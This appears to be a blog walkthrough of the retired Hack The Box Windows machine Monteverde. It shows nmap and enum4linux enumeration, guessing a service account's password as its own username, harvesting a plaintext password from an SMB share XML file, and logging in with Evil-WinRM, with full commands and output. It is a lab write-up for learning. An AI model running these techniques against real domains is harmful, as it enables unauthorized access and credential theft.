---
layout: post
title:  "HTB Monteverde Walkthrough"
author: nanobyte
date:   2020-06-19
description: Hack The Box writeup for Monteverde, Retired Windows Medium Box
tags: HTB_Walkthrough
---

I began my enumeration with my normal procedures, NMAP and enum4linux:

{% highlight bash linenos %}
nmap -sV -sC -p- -oA monteverde.nmap 10.10.10.172
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-30 08:08 CST
Nmap scan report for 10.10.10.172
Host is up (0.043s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-30 14:20:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49771/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/30%Time=5E32E3C7%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-01-30T14:22:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 380.55 seconds
{% endhighlight %}

{% highlight bash linenos %}
enum4linux -a 10.10.10.172
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan 30 08:17:35 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ====================================================
|    Enumerating Workgroup/Domain on 10.10.10.172    |
 ====================================================
[E] Can't find workgroup/domain

 ============================================
|    Nbtstat Information for 10.10.10.172    |
 ============================================ 
Looking up status of 10.10.10.172
No reply from 10.10.10.172

 =====================================
|    Session Check on 10.10.10.172    |
 ===================================== 
[+] Server 10.10.10.172 allows sessions using username '', password ''
[+] Got domain/workgroup name:

 ===========================================
|    Getting domain SID for 10.10.10.172    |
 =========================================== 
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

 ======================================
|    OS information on 10.10.10.172    |
 ====================================== 
[+] Got OS info for 10.10.10.172 from smbclient:
[+] Got OS info for 10.10.10.172 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 =============================
|    Users on 10.10.10.172    |
 =============================
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2
    Name: AAD_987d7f2f57d2  
    Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos
    Name: Dimitris Galanos
    Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest
    Name: (null)
    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope
    Name: Mike Hope
    Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary
    Name: Ray O'Leary
    Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs
    Name: SABatchJobs
    Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan
    Name: Sally Morgan
    Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata
    Name: svc-ata
    Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec
    Name: svc-bexec
    Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp
    Name: svc-netapp
    Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 =========================================
|    Share Enumeration on 10.10.10.172    |
 ========================================= 
        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.172

 ====================================================
|    Password Policy Information for 10.10.10.172    |
 ==================================================== 
[+] Attaching to 10.10.10.172 using a NULL share
[+] Trying protocol 445/SMB...
[+] Found domain(s):
        [+] MEGABANK
        [+] Builtin
[+] Password Info for Domain: MEGABANK
        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes
        [+] Password Complexity Flags: 000000
                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0
        [+] Minimum password age: 1 day 4 minutes
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set
[+] Retieved partial password policy with rpcclient:
Password Complexity: Disabled
Minimum Password Length: 7

 ==============================
|    Groups on 10.10.10.172    |
 ============================== 
[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+] Getting builtin group memberships:
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
{% endhighlight %}

I did not limit the output of either of these tools, and as you can see enum4linux contained a lot of information! Including a list of user names. I moved foeard with impacket's samrdump.py tool. There is a more detailed article which can be found <a href="https://www.hackingarticles.in/impacket-guide-smb-msrpc/" target="_blank">here</a>. Impacket's samrdump.py targets Windows Security Account Manager (SAM) to retrieve sensative information about the target. Samrdump.py lists out all the system shares, user accounts and other possible information about the target.

{% highlight bash linenos %}
python samrdump.py 10.10.10.172
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
                                                          
[*] Retrieving endpoint list from 10.10.10.172
Found domain(s):              
 . MEGABANK
 . Builtin                                  
[*] Looking up users in domain MEGABANK  
Found user: Guest, uid = 501 
Found user: AAD_987d7f2f57d2, uid = 1104
Found user: mhope, uid = 1601  
Found user: SABatchJobs, uid = 2602  
Found user: svc-ata, uid = 2603      
Found user: svc-bexec, uid = 2604
Found user: svc-netapp, uid = 2605
Found user: dgalanos, uid = 2613             
Found user: roleary, uid = 2614           
Found user: smorgan, uid = 2615
Guest (501)/FullName:                     
Guest (501)/UserComment:     
Guest (501)/PrimaryGroupId: 514    
Guest (501)/BadPasswordCount: 0    
Guest (501)/LogonCount: 0    
Guest (501)/PasswordLastSet: <never>
Guest (501)/PasswordDoesNotExpire: True    
Guest (501)/AccountIsDisabled: True     
Guest (501)/ScriptPath:
AAD_987d7f2f57d2 (1104)/FullName: AAD_987d7f2f57d2
AAD_987d7f2f57d2 (1104)/UserComment: 
AAD_987d7f2f57d2 (1104)/PrimaryGroupId: 513
AAD_987d7f2f57d2 (1104)/BadPasswordCount: 1
AAD_987d7f2f57d2 (1104)/LogonCount: 9
AAD_987d7f2f57d2 (1104)/PasswordLastSet: 2020-01-02 16:53:24.984897
AAD_987d7f2f57d2 (1104)/PasswordDoesNotExpire: True
AAD_987d7f2f57d2 (1104)/AccountIsDisabled: False
AAD_987d7f2f57d2 (1104)/ScriptPath: 
mhope (1601)/FullName: Mike Hope     
mhope (1601)/UserComment:   
mhope (1601)/PrimaryGroupId: 513  
mhope (1601)/BadPasswordCount: 0  
mhope (1601)/LogonCount: 2  
mhope (1601)/PasswordLastSet: 2020-01-02 17:40:05.908924
mhope (1601)/PasswordDoesNotExpire: True  
mhope (1601)/AccountIsDisabled: False  
mhope (1601)/ScriptPath:
SABatchJobs (2602)/FullName: SABatchJobs [71/354]
SABatchJobs (2602)/UserComment:
SABatchJobs (2602)/PrimaryGroupId: 513
SABatchJobs (2602)/BadPasswordCount: 0
SABatchJobs (2602)/LogonCount: 0
SABatchJobs (2602)/PasswordLastSet: 2020-01-03 06:48:46.392235
SABatchJobs (2602)/PasswordDoesNotExpire: True
SABatchJobs (2602)/AccountIsDisabled: False
SABatchJobs (2602)/ScriptPath:
svc-ata (2603)/FullName: svc-ata
svc-ata (2603)/UserComment:
svc-ata (2603)/PrimaryGroupId: 513
svc-ata (2603)/BadPasswordCount: 0
svc-ata (2603)/LogonCount: 0           
svc-ata (2603)/PasswordLastSet: 2020-01-03 06:58:31.332169
svc-ata (2603)/PasswordDoesNotExpire: True
svc-ata (2603)/AccountIsDisabled: False
svc-ata (2603)/ScriptPath:
svc-bexec (2604)/FullName: svc-bexec
svc-bexec (2604)/UserComment:
svc-bexec (2604)/PrimaryGroupId: 513
svc-bexec (2604)/BadPasswordCount: 0
svc-bexec (2604)/LogonCount: 0
svc-bexec (2604)/PasswordLastSet: 2020-01-03 06:59:55.863422
svc-bexec (2604)/PasswordDoesNotExpire: True
svc-bexec (2604)/AccountIsDisabled: False
svc-bexec (2604)/ScriptPath:
svc-netapp (2605)/FullName: svc-netapp  
svc-netapp (2605)/UserComment:
svc-netapp (2605)/PrimaryGroupId: 513
svc-netapp (2605)/BadPasswordCount: 0
svc-netapp (2605)/LogonCount: 0
svc-netapp (2605)/PasswordLastSet: 2020-01-03 07:01:42.786264
svc-netapp (2605)/PasswordDoesNotExpire: True
svc-netapp (2605)/AccountIsDisabled: False
svc-netapp (2605)/ScriptPath:
dgalanos (2613)/FullName: Dimitris Galanos
dgalanos (2613)/UserComment:
dgalanos (2613)/PrimaryGroupId: 513
dgalanos (2613)/BadPasswordCount: 0
dgalanos (2613)/LogonCount: 0
dgalanos (2613)/PasswordLastSet: 2020-01-03 07:06:10.519660
dgalanos (2613)/PasswordDoesNotExpire: True         
dgalanos (2613)/AccountIsDisabled: False
dgalanos (2613)/ScriptPath:
roleary (2614)/FullName: Ray O'Leary
roleary (2614)/UserComment:
roleary (2614)/PrimaryGroupId: 513
roleary (2614)/BadPasswordCount: 0
roleary (2614)/LogonCount: 0
roleary (2614)/PasswordLastSet: 2020-01-03 07:08:05.832167         
roleary (2614)/PasswordDoesNotExpire: True
roleary (2614)/AccountIsDisabled: False
roleary (2614)/ScriptPath:
smorgan (2615)/FullName: Sally Morgan
smorgan (2615)/UserComment: 
smorgan (2615)/PrimaryGroupId: 513
smorgan (2615)/BadPasswordCount: 0
smorgan (2615)/LogonCount: 0
smorgan (2615)/PasswordLastSet: 2020-01-03 07:09:21.629084 
smorgan (2615)/PasswordDoesNotExpire: True
smorgan (2615)/AccountIsDisabled: False
smorgan (2615)/ScriptPath: 
[*] Received 10 entries.
{% endhighlight %}
  
Again, a ton of output! This got to my first wall of the machine. It took me quite some time to figure out, that through bad administrator practices, sometimes passwords are set the same as account names. I began trying to connect with rpcclient with a service account name, and the name as a password.

Rpcclient is a tool for executing client-side Microsoft Remote Procedure Call (RPC) functions. Initially, RPC was used to create Windows client/server model in Windows NT. It is still available for use in current Windows systems.

{% highlight bash linenos %}
rpcclient -U "MEGABANK\SABatchJobs" 10.10.10.172
Enter MEGABANK\SABatchJobs's password: SABatchJobs
rpcclient $>
{% endhighlight %}

And with that, I was now logged in. One of my favorite guides to enumerate RPC can be locaed from a SANS guide, located <a href="https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/" target="_blank">here</a>. Using this guide, I used a lookupnames call for the users, and mhope returned some information about a Home Drive:

{% highlight bash linenos %}
rpcclient $> lookupnames mhope
mhope S-1-5-21-391775091-850290835-3566037492-1601 (User: 1)
rpcclient $> queryuser 1601
        User Name   :   mhope
        Full Name   :   Mike Hope
        Home Drive  :   \\monteverde\users$\mhope
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Fri, 31 Jan 2020 10:18:59 CST
        Logoff Time              :      Wed, 31 Dec 1969 18:00:00 CST
        Kickoff Time             :      Wed, 13 Sep 30828 21:48:05 CDT
        Password last set Time   :      Thu, 02 Jan 2020 17:40:06 CST
        Password can change Time :      Fri, 03 Jan 2020 17:40:06 CST
        Password must change Time:      Wed, 13 Sep 30828 21:48:05 CDT
        unknown_2[0..31]...
        user_rid :      0x641
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000002
        padding1[0..7]...
        logon_hrs[0..21]...
{% endhighlight %}

And again, I used another tool to attempt to connect to this remote home directory! I used another common enumeration tool, smbclient. Smbclient is a tool that can be viewed as similar to FTP on a local network. It connects to a local resource to access the SMB/CIFS resources on a remote computer. The SMB/CIFS is Server Message Block/Common Internet File System resource. Using smbclient, I used the same login information for rpcclient to login to smbclient:

{% highlight bash linenos %}
smbclient \\\\10.10.10.172\\users$ -U MEGABANK/SABatchJobs
Enter MEGABANK\SABatchJobs's password: SABatchJobs
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Fri Jan  3 07:12:48 2020
  ..                                  D        0  Fri Jan  3 07:12:48 2020
  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
  mhope                               D        0  Fri Jan  3 07:41:18 2020
  roleary                             D        0  Fri Jan  3 07:10:30 2020
  smorgan                             D        0  Fri Jan  3 07:10:24 2020

                524031 blocks of size 4096. 519955 blocks available
{% endhighlight %}

I can connect, and I also see a list of possible directories. I manually enumerated these directories, and when I viewed mhope's, I found an xml file:

{% highlight bash linenos %}
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 07:41:18 2020
  ..                                  D        0  Fri Jan  3 07:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020

                524031 blocks of size 4096. 519955 blocks available
{% endhighlight %}

I then use the get command to download the xml:

{% highlight bash linenos %}
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (7.1 KiloBytes/sec) (average 7.1 KiloBytes/sec)
{% endhighlight %}

Once on my computer, I quickly found a password available for mhope:

{% highlight bash linenos %}
cat azure.xml 
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
{% endhighlight %}

And with that, I had user credentials! As I always do, once I have credentials on a Windows machine I attempted to login with <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">Evil-WinRM</a>. This is an evil implenetation of the Windows Remote Management tool. It allows attackers to log into computers and provides a lot of features for testers to use, including the ability to quickly upload and download files. I logged in, and was able to own user on the box:

{% highlight bash linenos %}
evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$

*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> ls


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 user.txt


*Evil-WinRM* PS C:\Users\mhope\Desktop> more user.txt
4961976bd7d8f4exxxxxxxxxxxxxxxx
{% endhighlight %}
